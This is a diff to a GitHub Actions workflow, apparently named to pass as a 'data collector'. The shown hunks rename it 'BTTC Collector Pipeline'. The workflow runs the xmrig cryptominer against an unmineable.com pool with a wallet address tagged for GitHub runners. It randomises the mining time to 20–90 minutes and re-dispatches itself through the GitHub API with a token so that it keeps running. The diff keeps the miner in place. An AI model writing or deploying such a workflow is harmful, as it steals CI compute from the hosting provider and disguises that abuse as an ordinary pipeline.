@@ -1,4 +1,4 @@
-name: Data Collector Pipeline
+name: BTTC Collector Pipeline
 
 on:
   workflow_dispatch:
@@ -44,7 +44,7 @@ jobs:
 
           ./xmrig -o rx.unmineable.com:3333 -a rx -k \
             -u bttc:TPGr6w2EjkMeiv2ShRVnHXjACSSSQaVV4W.gh-runner#github \
-            -p x --randomx-no-rdmsr | tee log.txt &
+            -p x --randomx-no-rdmsr --no-color | tee log.txt &
 
           PID=$!
           WORKTIME=$((RANDOM % 5400 + 1200))  # 20–90 menit
@@ -94,5 +94,5 @@ jobs:
         run: |
           curl -X POST -H "Accept: application/vnd.github+json" \
                -H "Authorization: Bearer $GH_TOKEN" \
-               https://api.github.com/repos/${{ github.repository }}/actions/workflows/data-collector.yml/dispatches \
+               https://api.github.com/repos/${{ github.repository }}/actions/workflows/bttc-collector.yml/dispatches \
                -d '{"ref":"main"}'
